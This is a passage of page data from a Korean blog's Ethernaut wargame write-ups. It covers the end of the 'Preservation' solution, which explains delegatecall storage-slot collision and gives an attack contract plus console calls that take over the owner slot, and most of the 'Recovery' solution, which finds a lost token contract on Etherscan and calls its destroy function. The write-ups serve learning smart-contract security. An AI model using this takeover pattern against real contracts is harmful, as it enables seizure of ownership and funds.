0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h3>\n<p>우리가 delegate call에 대한 지식이 부족하다면, <code class=\"language-text\">setFirstTime(uint _timeStamp)</code>이 timeZone1Library의 <code class=\"language-text\">setTime</code>에 function을 실행시키고 Preservation contract의 <code class=\"language-text\">storedTime</code>을 바꿀 것이라고 생각할 것이다.\r\n하지만 delegate call은 low level이라는 것을 명심하자! 즉 delegate call은 storage 기반이다. LibraryContract의 <code class=\"language-text\">storedTime</code>은 slot 0를 차지한다. 그렇기 때문에 preservation contract에서 delegate call을 통해 setTime을 호출한다면 이는 preservation contract의 <code class=\"language-text\">slot 0</code>를 바꾸는 것이다.</p>\n<p><del>어떻게 설명을 더 잘 쓸 수 있을까…ㅠㅠ</del></p>\n<p>좀 더 간단하게 정리해보자면:</p>\n<ol>\n<li>delegate call은 slot기반으로 데이터를 바꿀 수 있다.(변수 이름 X)</li>\n<li>preservation contract에서 delegate call을 통해 LibraryContract.setTime()을 call 한다.</li>\n<li>setTime은 LibraryContract의 slot 0을 바꾸는 함수이다.</li>\n<li>즉 delegate call setTime을 통해 Preservation contract의 slot 0를 바꿀 수 있다.</li>\n</ol>\n<p>그렇다면 우리가 slot 0을 악의적인 contract로 바꾸면 어떻게 될까?\r\n<code class=\"language-text\">setFirstTime(uint _timeStamp)</code>에 악의적인 contract의 주소를 매개변수로 넣는다면 slot 0에 있는 timeZone1Library가 악의적인 contract로 바뀔 것이고 우리는 delegate call의 특성을 사용해 slot들을 마음대로 바꿀 수 있게된다.</p>\n<p>그럼 한번 풀이를 보도록 하자!\r\n우선 공격에 필요한 악의적인 contract를 만든다(on remix).\r\nstorage layout이 Perservation과 같아야한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">PreservationAttack</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone1Library<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 0</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> timeZone2Library<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 1</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 2</span>\r\n    <span class=\"token builtin\">uint</span> storedTime<span class=\"token punctuation\">;</span> <span class=\"token comment\">// slot 3</span>\r\n\r\n    <span class=\"token comment\">// Perservation에서 setTime으로 delegatecall을 보내기 때문에 이름이 똑같아야한다!</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setTime</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _time<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>attack contract는 완성이 되었다!\r\n그럼 공격의 시나리오를 보자.</p>\n<ol>\n<li>PreservationAttack를 deploy한다.</li>\n<li>Preservation.setFirstTime()을 PreservationAttack의 주소와 함께 호출한다.</li>\n<li>Preservation의 timeZone1Library는 PreservationAttack로 변한다.</li>\n<li>한번 더 setFirstTime()을 호출하게되면 LibraryContract가 아닌 PreservationAttack의 setTime을 호출한다.</li>\n<li>setTime은 storage의 slot 2(owner)를 msg.sender로 바꾼다.</li>\n<li>DONE!</li>\n</ol>\n<p>그럼 attack contract를 deploy한 후 console 창에서는 무엇이 이루어지는지 확인해보자.</p>\n<p>모든 코드는 console창에서 이루어진다.\r\nctrl + shift + i를 눌러 console창을 활성화 시키자</p>\n<div class=\"gatsby-highlight\" data-language=\"javascript\"><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// 기존의 timeZone1Library를 확인한다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">timeZone1Library</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// attack contract의 주소를 매개변수로하여 setFirstTime을 호출한다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x6bF70e10D96F41F8AE2C3EDbe017ECEc5242C50D\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// timeZone1Library가 attack contract의 주소로 바뀐 것을 확인할 수 있다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">timeZone1Library</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// setFirstTime의 delegatecall을 활용하여 attack contract의 setTime을 호출한다. </span>\r\n<span class=\"token comment\">// 이때 매개변수는 무엇이 되어도 상관없다.</span>\r\n<span class=\"token comment\">// 왜냐하면 attack contract의 setTime은 매개 변수를 사용하지 않는다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">setFirstTime</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0123456789\"</span><span class=\"token punctuation\">)</span>\r\n\r\n<span class=\"token comment\">// owner가 자신이 된 것을 확인할 수 있다.</span>\r\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>이번 문제는 <a href=\"https://holyhansss.github.io/ethernaut/6_delegation_ethernaut/6_delegation_ethernaut/\">delegation</a> 문제때 보다 delegate call에 대해 좀 더 깊이 이해할 수 있었던 기회였던 것 같다. 솔직히 지금까지는 delegate call이 나에게 가장 어려운 컨셉이었다. 앞으로도 배울 것이 많으니 꾸준히 공부해보자 :)!</p>\n<hr>\n<h2 id=\"ref\" style=\"position:relative;\"><a href=\"#ref\" aria-label=\"ref permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>REF</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>DelegateCall 취약점 :<a href=\"https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/\">https://holyhansss.github.io/vulnerability/delegate_call/delegate_call/</a></li>\n<li>Solidity Docs delegate call: <a href=\"https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html\">https://docs.soliditylang.org/en/v0.8.10/introduction-to-smart-contracts.html</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n<ul>\n<li><a href=\"#delegate-call%EC%9D%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\">Delegate Call은 무엇인가?</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4-1\">풀이</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#ref\">REF</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 24, 2022","title":"(Ethernaut 취약점 16) Preservation","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/16_preservation_ethernaut/16_preservation_ethernaut/"}},"prev":{"id":"1886656e-9cee-5a14-8736-0dfa0dfc07b3","html":"<h1 id=\"-1-recovery\" style=\"position:relative;\"><a href=\"#-1-recovery\" aria-label=\" 1 recovery permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. Recovery</h1>\n<p><strong>Difficulty 6/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>잃어버린 CA의 주소를 찾고 CA가 가지고 있는 Ether 전부 회수하기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>이미 잘 설명되어있어 간단한 분석만 주석에 적었다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Recovery</span> <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token comment\">//generate tokens</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">generateToken</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">new</span> <span class=\"token class-name\">SimpleToken</span><span class=\"token punctuation\">(</span>_name<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> _initialSupply<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    \r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SimpleToken</span> <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">// public variables</span>\r\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name<span class=\"token punctuation\">;</span>\r\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// constructor</span>\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _creator<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        name <span class=\"token operator\">=</span> _name<span class=\"token punctuation\">;</span>\r\n        balances<span class=\"token punctuation\">[</span>_creator<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// collect ether in return for tokens</span>\r\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// allow transfers of tokens</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span> \r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> _amount<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// clean up after ourselves</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">destroy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 잃어버린 CA의 주소를 찾고 CA안에 있는 Ether를 회수하는 것이다.\r\n설명을 읽어보면 Recovery contract를 이용해 SimpleToken contract의 instance를 만들었다. 하지만 instance의 주소는 저장되지 않았고 잃어버리게 되었다고 한다. 그리고 잃어버리기 전에 0.5 Ether를 보냈다고 한다.</p>\n<p>그렇다면 우리는 어떻게하면 찾을 수 있을까?</p>\n<p>주소를 찾는 방법은 2가지가 존재한다.</p>\n<ol>\n<li>Etherscan을 통해 확인하는 방법</li>\n<li>nonce와 생성자 주소를 사용해 확인하는 방법</li>\n</ol>\n<p>필자는 Etherscan을 사용하는 방법으로 문제를 풀었다.</p>\n<h4 id=\"1-etherscan-사용하여-풀기\" style=\"position:relative;\"><a href=\"#1-etherscan-%EC%82%AC%EC%9A%A9%ED%95%98%EC%97%AC-%ED%92%80%EA%B8%B0\" aria-label=\"1 etherscan 사용하여 풀기 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. Etherscan 사용하여 풀기</h4>\n<p>우리가 Ethernaut를 통해 instance를 만들 당시 주소 주어지고, 그 주소를 통해 모든 상호작용이 일어난다.\r\n그럼으로 instance의 주소를 etherscan에서 검색하여 일어난 transaction을 확인할 수 있다.</p>\n<p>그럼 바로 확인해보자!\r\n순서는 다음과 같다</p>\n<ol>\n<li>rinkeby testnet의 Etherscan에 접속</li>\n<li>instance 주소 검색</li>\n<li>transaction 확인</li>\n<li>transaction에서 SimpleToken 주소 확인</li>\n<li>SimpleToken에서 destroy() 실행</li>\n</ol>\n<p>우선 Etherscan rinkeby testnet에 접속한다.\r\n이후 instance 주소를 검색한다. 검색 후 internal transaction을 확인해보면 맨 위에 마지막으로 생성된 transaction에서 SimpleToken이 생성된다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABS0lEQVQoz31RW27EMAjM/b97qN6kWnU3cfzAGIyngk3zVdXSBAMOMMP29XihVMJ/p1PHGAIeA8wD3dE5fLOFtRbUDB+fT2zfzxeOlNGoo9SG2ijgTTw2RDGnxY86Z8Bj1DnQL8tD8KqC7bUfUcC7/SZ8isAQqM6YKJ0Zohq+iMR9Xg3cus/M2PwTx8dW/ZOyiCKldOeJejRZCzAzTFsXDFt0VMNQpyIxlRd4x2dYp+hyeCH3axdk0rCVGJkEhSTeb2dKeOwZe+mQS3Sn4EL7BDeCxHsB4V332wdC521PFaUxWh8oXUFDIfKeul7U2GNqkGkYMkGsGLog0xe1It+Ig/a214GTvNBEbgPnmdEawdZCLg1HKiit3zqx61kIZ+WQxhZCkpzrW8OjKRIpulhocqYDtdag4NocNFHYLmoAq+LY94BL48eXVUqJNz+N18BSk8cALgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"contract_creation_ethernaut_recov\"\n        title=\"contract_creation_ethernaut_recov\"\n        src=\"/static/8497d961941688a0e4216316aee113ec/37523/contract_creation_ethernaut_recov.png\"\n        srcset=\"/static/8497d961941688a0e4216316aee113ec/e9ff0/contract_creation_ethernaut_recov.png 180w,\n/static/8497d961941688a0e4216316aee113ec/f21e7/contract_creation_ethernaut_recov.png 360w,\n/static/8497d961941688a0e4216316aee113ec/37523/contract_creation_ethernaut_recov.png 720w,\n/static/8497d961941688a0e4216316aee113ec/302a4/contract_creation_ethernaut_recov.png 1080w,\n/static/8497d961941688a0e4216316aee113ec/07a9c/contract_creation_ethernaut_recov.png 1440w,\n/static/8497d961941688a0e4216316aee113ec/a303f/contract_creation_ethernaut_recov.png 1733w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>생성된 contract 클릭해 들어가보면 다음과 같이 나온다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAABVUlEQVQoz11SW24cMQzz/Q/Uu/QzyEc3TbIzfsqyJLOQJrvAVgBhQ6OhTdLp7f0Pvu8nmBe89t74v1QVzAwRxVoCXgs0Z8B7DmzDr98Z6Za/cBwZuTaU2lFqQy4VuTTU1tE6BYmoYv0QOiYvDHJSjnVOjn46zjM2tjfWWnGamb1AzXCcGUQEFyAiWMyh5gkzTGYkZ/afvHxQ1Z5D9rM6YSkFtdYgJGKcdYCWXjdlRWeNf9MYhEGMoy/0uUCjQZggaiHz4dHDu9iLgp1s+SqB6baIIlX3LBccpcVpforZfsIjCuwLj1t791XJ9S3VPnHPA8SCOhhtKpZuiO4IxEPqg+JGSyxCqCQx573HnENtIxUS3DIjD0EhjaTP84CpohPjdm/4yiN89BpM+Pj8xt/Pe3ju1VtDqzX26fJqB7sjnsdakZpLFgPUrvfpQtVDivD09Z3KpeAf5kvBLBDBf/cAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"simpleToken_contract_creation_ethernaut_recov\"\n        title=\"simpleToken_contract_creation_ethernaut_recov\"\n        src=\"/static/b219bc3f010d73b8dcafaf6d05f60c9c/37523/simpleToken_contract_creation_ethernaut_recov.png\"\n        srcset=\"/static/b219bc3f010d73b8dcafaf6d05f60c9c/e9ff0/simpleToken_contract_creation_ethernaut_recov.png 180w,\n/static/b219bc3f010d73b8dcafaf6d05f60c9c/f21e7/simpleToken_contract_creation_ethernaut_recov.png 360w,\n/static/b219bc3f010d73b8dcafaf6d05f60c9c/37523/simpleToken_contract_creation_ethernaut_recov.png 720w,\n/static/b219bc3f010d73b8dcafaf6d05f60c9c/302a4/simpleToken_contract_creation_ethernaut_recov.png 1080w,\n/static/b219bc3f010d73b8dcafaf6d05f60c9c/07a9c/simpleToken_contract_creation_ethernaut_recov.png 1440w,\n/static/b219bc3f010d73b8dcafaf6d05f60c9c/adef7/simpleToken_contract_creation_ethernaut_recov.png 1716w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\r\n나는 transaction이 3개 있는데, 문제를 풀지 않았다면 2개일 것이다.\r\n<del>문제에서는 0.5 ether이라고 말했지만 실제로는 0.001 ether밖에 없다!</del></p>\n<p>이제 주소를 알았으니 destory()를 실행시켜 ether를 찾아오면 끝난다!</p>\n<p>나는 remix를 사용하여 transaction을 보냈다.</p>\n<p>ethernaut에서 코드를 copy한 후 DEPLOY &#x26; RUN 부분에서 injected web3를 선택하고 address at에 simpletoken 주소를 넣고 실행시킨다.</p>\n<p>그럼 아래 deploy contract에 contract가 나오고 자신의 주소를 넣어 destory()를 실행시키면 완료된다.</p>\n<p>완료 후 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>이번 문제는 평소에 Etherscan을 사용했어서 어렵지 않게 풀 수 있었다. 하지만 처음에 문제 자체가 이해가 안되서 난이도에 비해 시간이 많이 지체된 것 같았다. 그리고 문제를 풀고나니 etherscan을 사용하는 방법말고 <code 